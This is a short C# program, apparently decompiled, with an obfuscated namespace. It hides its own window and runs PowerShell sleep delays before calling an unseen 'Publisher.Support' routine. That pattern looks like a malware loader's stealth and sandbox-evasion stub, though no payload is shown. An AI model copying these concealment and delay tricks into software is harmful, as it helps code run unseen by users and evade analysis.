using System;
using System.Diagnostics;

namespace Olklwtdpqcgelweitxp;

public static class Program
{
	[STAThread]
	public static void Main(string[] args)
	{
		if (args.Length == 0)
		{
			WinApi.ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), 0);
			Helper.Processor("Start-Sleep -s 5").WaitForExit();
			Helper.Processor("Start-Sleep -s 5").WaitForExit();
			Helper.Processor("Start-Sleep -s 5").WaitForExit();
		}
		else
		{
			Console.WriteLine("Test");
		}
		if (Publisher.IsBusy)
		{
			Publisher.Support();
		}
	}
}
